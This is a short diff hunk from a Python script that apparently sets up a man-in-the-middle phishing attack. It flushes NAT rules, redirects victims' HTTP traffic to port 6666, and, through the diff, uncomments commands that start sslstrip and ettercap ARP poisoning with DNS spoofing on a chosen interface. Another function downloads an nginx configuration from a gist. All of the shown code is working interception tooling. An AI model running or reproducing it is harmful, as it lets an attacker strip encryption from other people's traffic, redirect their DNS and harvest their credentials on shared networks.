@@ -115,8 +115,8 @@ def call_httrack(default_path):
     subprocess.call(["iptables","--flush","-t","nat"])
     subprocess.call(["iptables","-t","nat","-A","PREROUTING","-i",sys.argv[2],"-p","tcp","--destination-port", \
         "80","-j","REDIRECT","--to-port","6666"])
-    # subprocess.Popen(["sslstrip","-l","6666"], stderr=subprocess.DEVNULL)
-    # subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])
+    subprocess.Popen(["sslstrip","-l","6666"], stderr=subprocess.DEVNULL)
+    subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])
 
 def set_up_nginx(default_path):
     subprocess.call(["wget","https://gist.githubusercontent.com/mxavier6/3d37de2b8a64c202c2077f5e636253ac/raw/4c5b3932d94a5d14f537201dc22f8fb5f1847dad/nginx.conf"])
